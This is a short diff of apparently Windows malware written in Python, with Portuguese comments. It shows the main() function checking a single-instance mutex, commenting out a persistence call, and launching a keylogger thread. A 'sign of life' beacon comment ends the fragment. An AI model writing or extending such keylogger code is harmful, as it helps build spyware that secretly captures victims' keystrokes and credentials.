@@ -109,8 +109,8 @@ def main():
     mutex = windll.kernel32.CreateMutexA(None, 1, MUTEX)
     if windll.kernel32.GetLastError() == 0xB7:  # ERROR_ALREADY_EXISTS
         sys.exit()
-
-    persist()
+    # persistencia
+    ################persist()
     threading.Thread(target=start_keylogger, daemon=1).start()
 
     # sinal de vida
